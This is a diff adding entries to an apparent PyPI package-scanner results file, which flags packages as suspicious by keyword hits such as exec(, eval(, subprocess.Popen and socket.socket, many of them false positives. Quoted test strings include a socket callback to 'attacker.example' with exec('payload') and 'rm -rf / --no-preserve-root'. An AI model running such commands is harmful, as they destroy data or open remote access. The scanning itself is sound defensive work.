@@ -34360,5 +34360,253 @@
         "code_snippet": "proc = subprocess.Popen("
       }
     ]
+  },
+  {
+    "package_name": "sandkiln",
+    "checked_at": "2026-09-15T20:29:11.789273",
+    "download_url": "https://files.pythonhosted.org/packages/66/da/8122dbce813f0063a52b87bf11114c749b8cb6f5cba3d578a50d84685f92/sandkiln-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "sandkiln-0.1.0/src/sandkiln/sandbox.py",
+        "line": 273,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "return base64.b64decode(response[\"content_base64\"])"
+      }
+    ]
+  },
+  {
+    "package_name": "nexus-coding-agent",
+    "checked_at": "2026-09-15T20:29:11.901060",
+    "download_url": "https://files.pythonhosted.org/packages/cf/ca/eb0f8de4925923c7674e80edc37de17cfadf56763384392baa44fd7d6fa4/nexus_coding_agent-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "nexus_coding_agent-0.1.0/src/nexus/infrastructure/sandbox/local_process.py",
+        "line": 218,
+        "keyword_detected": "exec(",
+        "code_snippet": "return await asyncio.create_subprocess_exec("
+      },
+      {
+        "file": "nexus_coding_agent-0.1.0/src/nexus/infrastructure/sandbox/local_process.py",
+        "line": 230,
+        "keyword_detected": "exec(",
+        "code_snippet": "return await asyncio.create_subprocess_exec("
+      }
+    ]
+  },
+  {
+    "package_name": "realtime-analytics",
+    "checked_at": "2026-09-15T20:29:11.947849",
+    "download_url": "https://files.pythonhosted.org/packages/67/04/46e8ae8d7d0af54a8abd20aa2897880d621ed905c3771999b749f69a6215/realtime_analytics-0.2.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "realtime_analytics-0.2.0/realtime_analytics/client.py",
+        "line": 115,
+        "keyword_detected": "exec(",
+        "code_snippet": "exec(self.src, {\"__builtins__\": __builtins__}, scope)"
+      }
+    ]
+  },
+  {
+    "package_name": "polyserve",
+    "checked_at": "2026-09-15T20:29:12.130031",
+    "download_url": "https://files.pythonhosted.org/packages/7a/95/d50ae6a8de60c9a3f5ca73dfa956c0bac1a9eb9fb7025aeae7e5e775c87d/polyserve-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "polyserve-0.1.0/polyserve/backends/base.py",
+        "line": 53,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "self._proc: Optional[subprocess.Popen] = None"
+      },
+      {
+        "file": "polyserve-0.1.0/polyserve/backends/base.py",
+        "line": 75,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "self._proc = subprocess.Popen("
+      },
+      {
+        "file": "polyserve-0.1.0/polyserve/backends/base.py",
+        "line": 186,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:"
+      },
+      {
+        "file": "polyserve-0.1.0/polyserve/backends/base.py",
+        "line": 192,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:"
+      },
+      {
+        "file": "polyserve-0.1.0/polyserve/disagg.py",
+        "line": 287,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "self._proc: Optional[subprocess.Popen] = None"
+      },
+      {
+        "file": "polyserve-0.1.0/polyserve/disagg.py",
+        "line": 297,
+        "keyword_detected": "subprocess.Popen",
+        "code_snippet": "self._proc = subprocess.Popen(self.argv, stdout=self._log, stderr=subprocess.STDOUT)"
+      },
+      {
+        "file": "polyserve-0.1.0/polyserve/disagg.py",
+        "line": 328,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
+      },
+      {
+        "file": "polyserve-0.1.0/tests/test_measure_and_proxy.py",
+        "line": 67,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "with socket.socket() as s:"
+      }
+    ]
+  },
+  {
+    "package_name": "dumen",
+    "checked_at": "2026-09-15T20:29:12.283080",
+    "download_url": "https://files.pythonhosted.org/packages/51/3f/e3a81bd5cc6d9519ed27a8a5a97415cba3bf3cbaa2d675273877662fa1a6/dumen-0.7.3.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "dumen-0.7.3/dumen/cli.py",
+        "line": 77,
+        "keyword_detected": "eval(",
+        "code_snippet": "hf_model.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/dumen/benchmarks/judge_calibration.py",
+        "line": 61,
+        "keyword_detected": "exec(",
+        "code_snippet": "model_response=\"def exploit():\\n    socket.connect(('attacker.example', 4444))\\n    exec('payload')\","
+      },
+      {
+        "file": "dumen-0.7.3/dumen/benchmarks/sae_quality.py",
+        "line": 75,
+        "keyword_detected": "eval(",
+        "code_snippet": "sae.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/dumen/core/serialization.py",
+        "line": 70,
+        "keyword_detected": "eval(",
+        "code_snippet": "engine.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/dumen/core/serialization.py",
+        "line": 123,
+        "keyword_detected": "eval(",
+        "code_snippet": "engine.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/dumen/redteam/judge.py",
+        "line": 191,
+        "keyword_detected": "exec(",
+        "code_snippet": "or \"exec(\" in model_response"
+      },
+      {
+        "file": "dumen-0.7.3/examples/full_audit_pipeline.py",
+        "line": 54,
+        "keyword_detected": "eval(",
+        "code_snippet": "model.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/tests/test_coverage_gaps.py",
+        "line": 299,
+        "keyword_detected": "exec(",
+        "code_snippet": "model_runner_fn=lambda p: \"def exploit(): socket.connect(('x', 1)); exec('payload')\","
+      },
+      {
+        "file": "dumen-0.7.3/tests/test_coverage_gaps.py",
+        "line": 382,
+        "keyword_detected": "exec(",
+        "code_snippet": "client = self._client(local_engine_fn=lambda p: \"rm -rf / && exec('destroy') #!/bin/bash\")"
+      },
+      {
+        "file": "dumen-0.7.3/tests/test_coverage_gaps_v060.py",
+        "line": 167,
+        "keyword_detected": "exec(",
+        "code_snippet": "prompt=\"p\", generated_output=\"rm -rf / && exec(\\\"payload\\\") #!/bin/bash\""
+      },
+      {
+        "file": "dumen-0.7.3/tests/test_real_model_integration.py",
+        "line": 26,
+        "keyword_detected": "eval(",
+        "code_snippet": "model.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/tests/test_sae_quality.py",
+        "line": 90,
+        "keyword_detected": "eval(",
+        "code_snippet": "sae.eval()"
+      },
+      {
+        "file": "dumen-0.7.3/tests/test_steering_efficacy.py",
+        "line": 17,
+        "keyword_detected": "exec(",
+        "code_snippet": "EXPLOIT_REPLY = \"#!/bin/bash\\nrm -rf / --no-preserve-root\\nexec('payload')\""
+      }
+    ]
+  },
+  {
+    "package_name": "graphyco",
+    "checked_at": "2026-09-15T20:29:12.347638",
+    "download_url": "https://files.pythonhosted.org/packages/6e/ba/bfbb6628cff9bfad05eae98028b0fab3992990f3bbf54a1059d057dbc69e/graphyco-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "graphyco-0.1.0/src/graphyco/visualizer/__main__.py",
+        "line": 99,
+        "keyword_detected": "exec(",
+        "code_snippet": "sys.exit(app.exec())"
+      }
+    ]
+  },
+  {
+    "package_name": "ph-runtime-guest",
+    "checked_at": "2026-09-15T20:29:12.451194",
+    "download_url": "https://files.pythonhosted.org/packages/cc/a2/df2dbeb4ec6fe00c42b3d02161c00c105554d76343c8ec9a94df163a7abc/ph_runtime_guest-0.1.0.tar.gz",
+    "decision": "SUSPICIOUS",
+    "evidences": [
+      {
+        "file": "ph_runtime_guest-0.1.0/src/ph_runtime/channel.py",
+        "line": 46,
+        "keyword_detected": "socket.socket",
+        "code_snippet": "sock = socket.socket(fileno=fd)"
+      },
+      {
+        "file": "ph_runtime_guest-0.1.0/src/ph_runtime/runner.py",
+        "line": 323,
+        "keyword_detected": "exec(",
+        "code_snippet": "exec(code, self.globals)"
+      },
+      {
+        "file": "ph_runtime_guest-0.1.0/src/ph_runtime/snapshot.py",
+        "line": 207,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "namespace[name] = pickle.loads(base64.b64decode(blob))"
+      },
+      {
+        "file": "ph_runtime_guest-0.1.0/src/ph_runtime/snapshot.py",
+        "line": 216,
+        "keyword_detected": "base64.b64decode",
+        "code_snippet": "namespace[name] = dill.loads(base64.b64decode(blob))"
+      },
+      {
+        "file": "ph_runtime_guest-0.1.0/tests/test_cell_bindings.py",
+        "line": 133,
+        "keyword_detected": "exec(",
+        "code_snippet": "exec(compile_cell(source), namespace)  # running a cell is the unit under test"
+      },
+      {
+        "file": "ph_runtime_guest-0.1.0/tests/test_snapshot_paths.py",
+        "line": 125,
+        "keyword_detected": "exec(",
+        "code_snippet": "exec(\"def helper(value):\\n    return value * 3\", source)  # a cell-defined function"
+      }
+    ]
   }
 ]
